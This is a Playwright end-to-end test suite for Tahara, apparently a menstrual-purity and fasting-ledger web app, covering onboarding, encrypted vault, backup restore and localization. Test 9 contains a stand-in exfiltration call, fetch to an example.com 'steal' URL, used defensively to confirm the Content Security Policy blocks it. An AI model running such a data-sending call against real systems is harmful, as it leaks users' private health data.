// tests/tahara.spec.js
import {expect, test} from '@playwright/test';

test.describe('Tahara E2E UX Paths', () => {

    /**
     * Helper to read from Tahara IndexedDB
     */
    async function getIndexedDBData(page, storeName, key = 'data') {
        return await page.evaluate(async ({storeName, key}) => {
            return new Promise((resolve, reject) => {
                const request = indexedDB.open('tahara_db');
                request.onsuccess = (event) => {
                    const db = event.target.result;
                    try {
                        const transaction = db.transaction(storeName, 'readonly');
                        const store = transaction.objectStore(storeName);
                        const getReq = store.get(key);
                        getReq.onsuccess = () => resolve(getReq.result);
                        getReq.onerror = () => reject(getReq.error);
                    } catch (e) {
                        reject(e);
                    }
                };
                request.onerror = (event) => reject(event.target.error);
            });
        }, {storeName, key});
    }

    test('1. Onboarding Flow is visible and can be completed', async ({page}) => {
        // Clear storage to ensure it's treated as a first-time user
        await page.goto('/');
        await page.evaluate(async () => {
            localStorage.clear();
            // Also clear IndexedDB if it exists
            const dbs = await window.indexedDB.databases();
            dbs.forEach(db => window.indexedDB.deleteDatabase(db.name));
        });
        await page.reload();

        // Verify Onboarding Modal is visible
        const modal = page.locator('#onboardingModal');
        await expect(modal).toBeVisible();

        // Click "Next" twice, then "Get Started"
        const nextBtn = page.locator('#onbNextBtn');
        await nextBtn.click(); // Step 1 -> 2
        await nextBtn.click(); // Step 2 -> 3
        await nextBtn.click(); // Step 3 -> Finish

        // Verify modal is hidden and local storage is updated
        await expect(modal).toBeHidden();
        const isOnboarded = await page.evaluate(() => localStorage.getItem('tahara_onboarded'));
        expect(isOnboarded).toBe('true');
    });

    test('2. Core Loop: Mark Flow, Check Status, and Undo via Modal', async ({page}) => {
        // Bypass onboarding for this test
        await page.addInitScript(() => {
            localStorage.setItem('tahara_onboarded', 'true');
        });
        await page.goto('/');

        // Wait for App to be ready (DOM plus IndexedDB init)
        await page.waitForFunction(() => window.App && window.calculateStats);

        // Ensure we start in Purity
        const mainBtn = page.locator('#mainActionBtn');
        const statusText = page.locator('#current-state-text');
        
        await expect(statusText).toHaveText('Purity', { timeout: 10000 });

        // 1. Mark Flow Started
        await mainBtn.click();
        await expect(statusText).toHaveText('Hayd', { timeout: 10000 });
        await expect(mainBtn).toHaveText('Mark Purity Achieved', { timeout: 10000 });

        // Verify toast appeared
        await expect(page.locator('#toast-container')).toContainText('Status updated successfully', { timeout: 10000 });

        // 2. Undo the action (Triggers Confirmation Modal)
        await page.locator('#undoBtn').click();

        // 3. Confirm the deletion in the modal
        const confirmBtn = page.locator('.modal-confirm-btn');
        await expect(confirmBtn).toBeVisible({ timeout: 10000 });
        await confirmBtn.click();

        // Verify we are back to Purity
        await expect(statusText).toHaveText('Purity', { timeout: 10000 });
    });

    test('3. Fasting Ledger: Add and Remove Missed/Paid Days', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.waitForFunction(() => window.App);

        // Navigate to Fasting Tab
        await page.locator('button[data-tab="fasting"]').click();
        await expect(page.locator('#view-fasting')).toBeVisible({ timeout: 10000 });

        // Add 2 missed fasts
        const addMissedBtn = page.locator('button[data-i18n-aria="aria_add_missed"]');
        await addMissedBtn.click();
        await page.waitForTimeout(100); // UI debounce
        await addMissedBtn.click();

        // Verify Missed = 2, Debt = 2
        await expect(page.locator('#totalMissed')).toHaveText('2', { timeout: 10000 });
        await expect(page.locator('#debtDisplay')).toHaveText('2', { timeout: 10000 });

        // Add 1 Paid fast
        const addPaidBtn = page.locator('button[data-i18n-aria="aria_add_paid"]');
        await addPaidBtn.click();

        // Verify Paid = 1, Debt = 1
        await expect(page.locator('#totalPaid')).toHaveText('1');
        await expect(page.locator('#debtDisplay')).toHaveText('1');

        // Verify IndexedDB state
        const fastingData = await getIndexedDBData(page, 'fasting');
        expect(fastingData.missed).toBe(2);
        expect(fastingData.paid).toBe(1);
    });

    test('4. Settings: Dark Mode Toggle modifies the DOM', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.waitForFunction(() => window.App && typeof window.switchTab === 'function');
        await page.evaluate(() => window.switchTab('settings'));

        const themeToggle = page.locator('#themeToggle');
        const body = page.locator('body');
        await expect(themeToggle).toBeVisible();

        const classList = await body.getAttribute('class');
        expect(classList.split(' ')).not.toContain('dark');

        // Toggle Dark Mode
        await themeToggle.click();

        // Verify dark class is applied by the toggle handler
        await expect(body).toHaveClass(/(?:^| )dark(?: |$)/);
        const isDark = await page.evaluate(() => localStorage.getItem('tahara_darkMode'));
        expect(isDark).toBe('true');
    });

    test('5. Settings: Language Switch updates layout to RTL and reloads', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        const langSelect = page.locator('#langSelect');

        // Select Arabic
        await langSelect.selectOption('ar');

        // The app triggers location.reload(), so we wait for the page to finish loading
        await page.waitForLoadState('networkidle');

        // Verify HTML dir is RTL and Lang is AR
        const htmlDir = await page.getAttribute('html', 'dir');
        const htmlLang = await page.getAttribute('html', 'lang');

        expect(htmlDir).toBe('rtl');
        expect(htmlLang).toBe('ar');

        // Verify text is translated (Home tab button)
        await expect(page.locator('button[data-tab="home"]')).toContainText('الرئيسية');
    });

    test('6. Calendar & Daily Logs: Select day and toggle mood', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        // Navigate to Calendar
        await page.locator('button[data-tab="calendar"]').click();
        await expect(page.locator('#view-calendar')).toBeVisible();

        // The Daily Log UI should be visible since today is selected by default
        await expect(page.locator('#dailyLogContainer')).toBeVisible();

        // Toggle a mood (e.g., Happy)
        const happyBtn = page.locator('#moodOptions button').first(); // Assumes 'Happy' is first
        await happyBtn.click();

        // Verify it got the active class (bg-rose-500)
        await expect(happyBtn).toHaveClass(/.*bg-rose-500.*/);

        // Verify it saved to IndexedDB
        const logs = await getIndexedDBData(page, 'logs');
        const hasHappyMood = Object.values(logs).some(dayTags => dayTags.includes('mood_happy'));
        expect(hasHappyMood).toBe(true);
    });

    test('7. Migration: Legacy LocalStorage data is moved to IndexedDB', async ({page}) => {
        // 1. Setup legacy data
        await page.goto('/');
        await page.evaluate(() => {
            localStorage.clear();
            localStorage.setItem('tahara_history', JSON.stringify([{status: 'hayd', time: new Date().toISOString()}]));
            localStorage.setItem('tahara_fasting', JSON.stringify({missed: 5, paid: 2}));
            localStorage.setItem('tahara_status', 'hayd');
            localStorage.setItem('tahara_last_changed', new Date().toISOString());
            localStorage.setItem('tahara_onboarded', 'true');
        });

        // 2. Reload page to trigger migration
        await page.reload();
        
        // Wait for migration and app init
        await expect(page.locator('#current-state-text')).toHaveText('Hayd');

        // 3. Verify LocalStorage is cleaned up
        const keys = await page.evaluate(() => Object.keys(localStorage));
        expect(keys).not.toContain('tahara_history');
        expect(keys).not.toContain('tahara_fasting');
        expect(keys).not.toContain('tahara_status');

        // 4. Verify data is in IndexedDB
        const fasting = await getIndexedDBData(page, 'fasting');
        expect(fasting.missed).toBe(5);
        expect(fasting.paid).toBe(2);

        const history = await getIndexedDBData(page, 'history');
        expect(history.length).toBe(1);
        expect(history[0].status).toBe('hayd');
    });

    test('8. Migration Edge Case: Corrupted LocalStorage data handles graceully', async ({page}) => {
        await page.goto('/');
        await page.evaluate(() => {
            localStorage.clear();
            localStorage.setItem('tahara_history', '{broken_json]');
            localStorage.setItem('tahara_status', 'hayd');
            localStorage.setItem('tahara_onboarded', 'true');
        });

        await page.reload();
        
        // App should still load (fallback to purity if history is broken)
        await expect(page.locator('#current-state-text')).toBeVisible();
        
        // localStorage should be cleared to prevent infinite migration loops
        const history = await page.evaluate(() => localStorage.getItem('tahara_history'));
        expect(history).toBeNull();
    });

    test('9. Security: Content Security Policy (CSP) blocks external fetch', async ({page}) => {
        await page.goto('/');
        
        // Attempt to fetch from an external URL
        const fetchError = await page.evaluate(async () => {
            try {
                await fetch('https://example.com/steal?data=test');
                return null;
            } catch (e) {
                return e.message;
            }
        });

        // CSP should cause a "Failed to fetch" error
        expect(fetchError).toContain('Failed to fetch');
    });

    test('10. UI Logic: Symptom vs. Mood Selection (Test Case 6)', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.waitForFunction(() => window.App && typeof window.switchTab === 'function');
        await expect(page.locator('#view-home')).toBeVisible();
        await page.locator('button[data-tab="calendar"]').click();
        await expect(page.locator('#view-calendar')).toBeVisible();

        const moodButtons = page.locator('#moodOptions button');
        const wellbeingButtons = page.locator('#wellbeingOptions button');
        await expect(moodButtons.first()).toBeVisible();
        await expect(wellbeingButtons.first()).toBeVisible();

        // Mood: Radio behavior
        await moodButtons.nth(0).click(); // Happy
        await moodButtons.nth(1).click(); // Calm
        await expect(moodButtons.nth(0)).not.toHaveClass(/bg-rose-500/);
        await expect(moodButtons.nth(1)).toHaveClass(/bg-rose-500/);

        // Wellbeing: Checkbox behavior (Pain is index 3 in Wellbeing list)
        await wellbeingButtons.nth(3).click(); // Pain
        await wellbeingButtons.nth(4).click(); // Fatigue
        await expect(wellbeingButtons.nth(3)).toHaveClass(/bg-rose-500/);
        await expect(wellbeingButtons.nth(4)).toHaveClass(/bg-rose-500/);
    });

    test('11. UI Logic: Calendar Future Date Prevention (Test Case 7)', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="calendar"]').click();

        // Get initial selected date text
        const initialDateText = await page.locator('#selectedDateText').innerText();

        // Try to find a future date (opacity-40 class)
        const futureDate = page.locator('#calendarDays div.opacity-40').first();
        if (await futureDate.isVisible()) {
            await futureDate.click();
            const newDateText = await page.locator('#selectedDateText').innerText();
            expect(newDateText).toBe(initialDateText);
        }
    });

    test('12. UI Logic: Averages Empty State (Test Case 8)', async ({page}) => {
        await page.goto('/');
        await page.evaluate(() => {
            localStorage.clear();
            localStorage.setItem('tahara_onboarded', 'true');
        });
        // Set only 1 history entry (need 2 for averages)
        await page.evaluate(async () => {
            const request = indexedDB.open('tahara_db');
            request.onsuccess = (event) => {
                const db = event.target.result;
                const tx = db.transaction(['history', 'status'], 'readwrite');
                tx.objectStore('history').put([{status: 'hayd', time: new Date().toISOString()}], 'data');
                tx.objectStore('status').put({status: 'hayd', lastChanged: new Date().toISOString()}, 'data');
            };
        });
        await page.reload();
        await page.locator('button[data-tab="calendar"]').click();

        // Should NOT show NaN or 0d
        const avgCycle = page.locator('#avgCycleText');
        await expect(avgCycle).not.toContainText('NaN');
        await expect(avgCycle).not.toContainText('0d');
        
        await expect(page.locator('#nextPeriodText')).toHaveText('--');
    });

    test('13. UI Logic: Settings Reminder Time Reveal (Test Case 9)', async ({page}) => {
        await page.addInitScript(() => {
            localStorage.setItem('tahara_onboarded', 'true');
            // Mock Notification API
            window.Notification = {
                permission: 'granted',
                requestPermission: async () => 'granted'
            };
        });
        await page.goto('/');
        await page.waitForFunction(() => window.App);
        await page.locator('button[data-tab="settings"]').click();
        await expect(page.locator('#view-settings')).toBeVisible();

        const toggleVisual = page.locator('#reminderToggle + div');
        const timeContainer = page.locator('#reminderTimeContainer');

        await expect(timeContainer).toBeHidden();
        await toggleVisual.click();
        await expect(timeContainer).toBeVisible();
        await toggleVisual.click();
        await expect(timeContainer).toBeHidden();
    });

    test('14. UI Logic: Diagnostic JSON Export (Test Case 10)', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        // Intercept download
        const downloadPromise = page.waitForEvent('download');
        await page.locator('#settingsDiagnosticBtn').click();
        const download = await downloadPromise;

        expect(download.suggestedFilename()).toContain('tahara-diagnostics');
        
        // Verify toast
        await expect(page.locator('#toast-container')).toContainText('Diagnostic log saved');
    });

    test('15. Privacy Vault: Enable, Lock, and Unlock via OS Fallback', async ({page}) => {
        // Mock WebAuthn globally for this test
        await page.addInitScript(() => {
            if (navigator.credentials) {
                // Mock registration returning a fake rawId
                navigator.credentials.create = async () => ({
                    rawId: new Uint8Array([1, 2, 3, 4]).buffer
                });
                // Mock verification
                navigator.credentials.get = async () => ({});
            }
        });

        // Clear everything first
        await page.goto('/');
        await page.evaluate(async () => {
            localStorage.clear();
            const dbs = await window.indexedDB.databases();
            for (const db of dbs) {
                await window.indexedDB.deleteDatabase(db.name);
            }
        });
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        // 1. Navigate to Settings and Toggle Vault
        await page.locator('button[data-tab="settings"]').click();
        const vaultToggle = page.locator('#vaultToggle + div');
        
        await vaultToggle.click();
        // Give time for toggle logic (encryption of existing data) to run
        await page.waitForTimeout(1000);
        
        // 2. Reload and Verify Lock Screen
        await page.reload();
        await page.waitForTimeout(1000); 

        await expect(page.locator('#vaultLockScreen')).toBeVisible();

        // 3. Unlock by clicking the Unlock button (triggers fallback in non-native)
        await page.locator('#vaultUnlockBtn').click();

        // Verify Lock Screen is hidden
        await expect(page.locator('#vaultLockScreen')).toBeHidden();
        await expect(page.locator('#current-state-text')).toContainText('Purity');
    });

    test('17. UI Logic: Prediction Range and Disclaimer', async ({page}) => {
        await page.goto('/');
        await page.evaluate(() => {
            const DAY_MS = 86400000;
            const now = new Date().getTime();
            const history = [
                {status: 'purity', time: new Date(now).toISOString()},
                {status: 'hayd', time: new Date(now - (10 * DAY_MS)).toISOString()},
                {status: 'purity', time: new Date(now - (15 * DAY_MS)).toISOString()},
                {status: 'hayd', time: new Date(now - (40 * DAY_MS)).toISOString()},
                {status: 'purity', time: new Date(now - (45 * DAY_MS)).toISOString()}
            ];
            window.App.history = history;
            window.App.status = 'purity';
            window.App.lastChanged = history[0].time;
            window.switchTab('home');
            window.calculateStats();
        });
        
        await page.waitForTimeout(1000); 

        const nextPeriodText = page.locator('#nextPeriodText');
        const disclaimer = page.locator('[data-i18n="prediction_disclaimer"]');

        await expect(nextPeriodText).toContainText(' – ');
        // We use innerText check as fallback if toBeVisible is flaky in headless
        const text = await disclaimer.innerText();
        expect(text).toContain('Estimated based on your history');
    });

    test('18. Maliki Settings: Habit input visibility and persistence', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const madhhabSelect = page.locator('#madhhabSelect');
        const habitContainer = page.locator('#habitContainer');
        const habitInput = page.locator('#habitInput');

        // Initially hidden (Hanafi)
        await expect(habitContainer).toBeHidden();

        // Switch to Maliki
        await madhhabSelect.selectOption('maliki');
        await expect(habitContainer).toBeVisible();

        // Change habit and verify persistence
        await habitInput.fill('8');
        await habitInput.dispatchEvent('change');
        
        await page.reload();
        await page.locator('button[data-tab="settings"]').click();
        await expect(madhhabSelect).toHaveValue('maliki');
        await expect(habitContainer).toBeVisible();
        await expect(habitInput).toHaveValue('8');
        
        const habitVal = await page.evaluate(() => localStorage.getItem('tahara_habitDays'));
        expect(habitVal).toBe('8');
    });

    test('19. Backup & Restore: Round-trip data integrity', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        // 1. Setup some data
        await page.evaluate(async () => {
            const history = [{status: 'hayd', time: new Date().toISOString()}];
            const fasting = {missed: 10, paid: 3};
            const logs = {"2026-03-01": ["mood_happy"]};

            await new Promise((resolve, reject) => {
                const dbReq = indexedDB.open('tahara_db', 1);
                dbReq.onupgradeneeded = (e) => {
                    const db = e.target.result;
                    if (!db.objectStoreNames.contains('history')) db.createObjectStore('history');
                    if (!db.objectStoreNames.contains('fasting')) db.createObjectStore('fasting');
                    if (!db.objectStoreNames.contains('logs')) db.createObjectStore('logs');
                    if (!db.objectStoreNames.contains('status')) db.createObjectStore('status');
                };
                dbReq.onerror = () => reject(dbReq.error);
                dbReq.onsuccess = (e) => {
                    try {
                        const db = e.target.result;
                        const tx = db.transaction(['history', 'fasting', 'logs', 'status'], 'readwrite');
                        tx.objectStore('history').put(history, 'data');
                        tx.objectStore('fasting').put(fasting, 'data');
                        tx.objectStore('logs').put(logs, 'data');
                        tx.objectStore('status').put({status: 'hayd', lastChanged: history[0].time}, 'data');
                        tx.oncomplete = () => resolve();
                        tx.onerror = () => reject(tx.error || new Error('IndexedDB transaction failed'));
                    } catch (err) {
                        reject(err);
                    }
                };
            });
        });
        await page.reload();

        // 2. Export Backup
        await page.locator('button[data-tab="settings"]').click();
        const downloadPromise = page.waitForEvent('download');
        await page.locator('#settingsBackupBtn').click();
        const download = await downloadPromise;
        const path = await download.path();
        const fs = require('fs');
        const backupContent = fs.readFileSync(path, 'utf8');

        // 3. Clear App Data
        await page.locator('#settingsResetBtn').click();
        await page.locator('.modal-confirm-btn').click();
        await page.waitForLoadState('networkidle');

        // 4. Restore from Backup
        await page.locator('button[data-tab="settings"]').click();
        
        await page.evaluate((json) => {
            const data = JSON.parse(json);
            window.showRestorePreview(data);
        }, backupContent);

        // Click confirm and wait for the page reload
        await Promise.all([
            page.waitForNavigation({ waitUntil: 'load' }),
            page.locator('#restorePreviewContainer .modal-confirm-btn').click(),
        ]);

        // Wait for App to re-init
        await page.waitForFunction(() => window.App && window.App.history);

        // 5. Verify restored data
        await page.evaluate(() => window.switchTab('home'));
        await expect(page.locator('#current-state-text')).toHaveText('Hayd', { timeout: 15000 });
        await page.locator('button[data-tab="fasting"]').click();
        await expect(page.locator('#totalMissed')).toHaveText('10');
        await expect(page.locator('#totalPaid')).toHaveText('3');
    });

    test('20. Localization: RTL mirroring for Arabic', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        
        const langSelect = page.locator('#langSelect');
        await Promise.all([
            page.waitForNavigation({waitUntil: 'load'}),
            langSelect.selectOption('ar'),
        ]);
        await expect(page).toHaveURL(/(?:\?|&)lang=ar(?:&|$)/);

        // Check HTML attributes
        await expect(page.locator('html')).toHaveAttribute('dir', 'rtl');
        await expect(page.locator('html')).toHaveAttribute('lang', 'ar');

        // Check listbox translations (as requested by user earlier)
        const malikiOption = page.locator('#madhhabSelect option[value="maliki"]');
        await expect(malikiOption).toHaveText('مالكي');
        const hanbaliOption = page.locator('#madhhabSelect option[value="hanbali"]');
        await expect(hanbaliOption).toHaveText('حنبلي');
    });

    test('21. Backup Restore Resilience: invalid last_changed falls back safely', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        const nowIso = new Date().toISOString();
        const backup = {
            schema_version: 1,
            tahara_status: 'hayd',
            tahara_history: [{status: 'hayd', time: nowIso}],
            tahara_fasting: {missed: 1, paid: 0},
            tahara_logs: {},
            tahara_last_changed: 'not-a-valid-date',
            export_date: nowIso
        };

        await page.locator('button[data-tab="settings"]').click();
        await page.evaluate((data) => window.showRestorePreview(data), backup);

        await Promise.all([
            page.waitForNavigation({waitUntil: 'load'}),
            page.locator('#restorePreviewContainer .modal-confirm-btn').click(),
        ]);

        await page.waitForFunction(() => window.App && window.App.history);
        await expect(page.locator('#current-state-text')).toHaveText('Hayd', {timeout: 15000});
        await expect(page.locator('#time-elapsed')).not.toContainText('NaN');

        const restoredStatus = await getIndexedDBData(page, 'status');
        expect(restoredStatus.status).toBe('hayd');
        expect(Number.isNaN(new Date(restoredStatus.lastChanged).getTime())).toBe(false);
    });

    test('22. Vault Lock State: encrypted DB does not leak blobs into App state before unlock', async ({page}) => {
        await page.addInitScript(() => {
            localStorage.setItem('tahara_onboarded', 'true');
            if (navigator.credentials) {
                navigator.credentials.create = async () => ({
                    rawId: new Uint8Array([1, 2, 3, 4]).buffer
                });
                navigator.credentials.get = async () => ({});
            }
        });

        await page.goto('/');
        await page.evaluate(async () => {
            localStorage.removeItem('tahara_vault_enabled');
            const dbs = await window.indexedDB.databases();
            for (const db of dbs) {
                await window.indexedDB.deleteDatabase(db.name);
            }
        });
        await page.reload();

        await page.locator('button[data-tab="settings"]').click();
        await page.locator('#vaultToggle + div').click();
        await page.waitForTimeout(1000);

        await page.reload();
        await expect(page.locator('#vaultLockScreen')).toBeVisible();

        const runtimeState = await page.evaluate(() => ({
            isHistoryArray: Array.isArray(window.App?.history),
            isHistoryBlob: window.App?.history instanceof Uint8Array,
            statusType: typeof window.App?.status,
            lastChangedValid: !Number.isNaN(new Date(window.App?.lastChanged).getTime())
        }));

        expect(runtimeState.isHistoryArray).toBe(true);
        expect(runtimeState.isHistoryBlob).toBe(false);
        expect(runtimeState.statusType).toBe('string');
        expect(runtimeState.lastChangedValid).toBe(true);
    });

    test('23. Backup Restore Security: reject invalid payload shape/status', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        // Invalid status + non-array history should be rejected before modal render
        const invalidPayload = {
            schema_version: 1,
            tahara_status: 'hacked',
            tahara_history: {bad: true},
            tahara_fasting: {missed: 4, paid: 1},
            tahara_logs: {"2026-03-01": ["mood_happy"]},
            tahara_last_changed: new Date().toISOString(),
            export_date: new Date().toISOString()
        };

        await page.evaluate((data) => window.showRestorePreview(data), invalidPayload);
        await expect(page.locator('#restorePreviewContainer')).toHaveCount(0);
        await expect(page.locator('#current-state-text')).toHaveText('Purity');
    });

    test('24. Backup Restore Security: prevent duplicate restore preview modal', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const validPayload = {
            schema_version: 1,
            tahara_status: 'purity',
            tahara_history: [{status: 'purity', time: new Date().toISOString()}],
            tahara_fasting: {missed: 0, paid: 0},
            tahara_logs: {},
            tahara_last_changed: new Date().toISOString(),
            export_date: new Date().toISOString()
        };

        await page.evaluate((data) => {
            window.showRestorePreview(data);
            window.showRestorePreview(data);
            window.showRestorePreview(data);
        }, validPayload);

        await expect(page.locator('#restorePreviewContainer')).toHaveCount(1);
        await page.locator('#restorePreviewContainer .modal-cancel-btn').click();
        await expect(page.locator('#restorePreviewContainer')).toHaveCount(0);
    });

    test('25. Backup Restore Security: oversized file is rejected safely', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const chooserPromise = page.waitForEvent('filechooser');
        await page.locator('#settingsRestoreBtn').click();
        const chooser = await chooserPromise;

        const tooLargePayload = `{\"x\":\"${'a'.repeat(2 * 1024 * 1024)}\"}`;
        await chooser.setFiles({
            name: 'oversized-backup.json',
            mimeType: 'application/json',
            buffer: Buffer.from(tooLargePayload, 'utf8')
        });

        await expect(page.locator('#restorePreviewContainer')).toHaveCount(0);
        await expect(page.locator('#toast-container')).toContainText('too large', {timeout: 10000});
    });

    test('26. Backup Restore UX: import limit hint is visible and localized with size', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        await expect(page.locator('#importLimitHint')).toContainText('2 MB');
    });

    test('27. Backup Restore Security: valid small file opens restore preview', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const chooserPromise = page.waitForEvent('filechooser');
        await page.locator('#settingsRestoreBtn').click();
        const chooser = await chooserPromise;

        const payload = JSON.stringify({
            schema_version: 1,
            tahara_status: 'purity',
            tahara_last_changed: new Date().toISOString(),
            tahara_history: [{status: 'purity', time: new Date().toISOString()}],
            tahara_fasting: {missed: 0, paid: 0},
            tahara_logs: {},
            export_date: new Date().toISOString()
        });

        await chooser.setFiles({
            name: 'valid-small-backup.json',
            mimeType: 'application/json',
            buffer: Buffer.from(payload, 'utf8')
        });

        await expect(page.locator('#restorePreviewContainer')).toHaveCount(1);
        await page.locator('#restorePreviewContainer .modal-cancel-btn').click();
        await expect(page.locator('#restorePreviewContainer')).toHaveCount(0);
    });

    test('28. Backup Restore Security: invalid JSON file shows error toast and no modal', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const chooserPromise = page.waitForEvent('filechooser');
        await page.locator('#settingsRestoreBtn').click();
        const chooser = await chooserPromise;

        await chooser.setFiles({
            name: 'broken-backup.json',
            mimeType: 'application/json',
            buffer: Buffer.from('{broken_json]', 'utf8')
        });

        await expect(page.locator('#restorePreviewContainer')).toHaveCount(0);
        await expect(page.locator('#toast-container')).toContainText('Invalid backup file', {timeout: 10000});
    });

    test('29. i18n Smoke: Spanish import error toast is translated', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('#langSelect').selectOption('es');
        await page.waitForLoadState('networkidle');
        await page.locator('button[data-tab="settings"]').click();

        const chooserPromise = page.waitForEvent('filechooser');
        await page.locator('#settingsRestoreBtn').click();
        const chooser = await chooserPromise;

        await chooser.setFiles({
            name: 'broken-backup-es.json',
            mimeType: 'application/json',
            buffer: Buffer.from('{broken_json]', 'utf8')
        });

        await expect(page.locator('#restorePreviewContainer')).toHaveCount(0);
        await expect(page.locator('#toast-container')).toContainText('Archivo inválido', {timeout: 10000});
    });

    test('30. Restore Audit: rejected oversized import is recorded', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const chooserPromise = page.waitForEvent('filechooser');
        await page.locator('#settingsRestoreBtn').click();
        const chooser = await chooserPromise;

        const tooLargePayload = `{\"x\":\"${'a'.repeat(2 * 1024 * 1024)}\"}`;
        await chooser.setFiles({
            name: 'oversized-audit-check.json',
            mimeType: 'application/json',
            buffer: Buffer.from(tooLargePayload, 'utf8')
        });

        const audit = await page.evaluate(() => JSON.parse(localStorage.getItem('tahara_restore_audit') || '[]'));
        expect(Array.isArray(audit)).toBe(true);
        expect(audit.some(e => e.event === 'restore_rejected_too_large')).toBe(true);
    });

    test('31. Restore Audit: successful restore is recorded', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const payload = {
            schema_version: 1,
            tahara_status: 'hayd',
            tahara_last_changed: new Date().toISOString(),
            tahara_history: [{status: 'hayd', time: new Date().toISOString()}],
            tahara_fasting: {missed: 2, paid: 0},
            tahara_logs: {},
            export_date: new Date().toISOString()
        };

        await page.evaluate((data) => window.showRestorePreview(data), payload);
        await Promise.all([
            page.waitForNavigation({waitUntil: 'load'}),
            page.locator('#restorePreviewContainer .modal-confirm-btn').click(),
        ]);

        const audit = await page.evaluate(() => JSON.parse(localStorage.getItem('tahara_restore_audit') || '[]'));
        expect(Array.isArray(audit)).toBe(true);
        expect(audit.some(e => e.event === 'restore_applied')).toBe(true);
    });

    test('32. Resilience: strings.json failure falls back to built-in labels', async ({page}) => {
        await page.route('**/strings.json', route => route.abort());
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        await expect(page.locator('#current-state-text')).toHaveText('Purity');
        await expect(page.locator('#mainActionBtn')).toContainText('Mark Flow Started');

        await page.locator('button[data-tab="calendar"]').click();
        await expect(page.locator('#moodOptions button').first()).not.toHaveText('');
    });
});
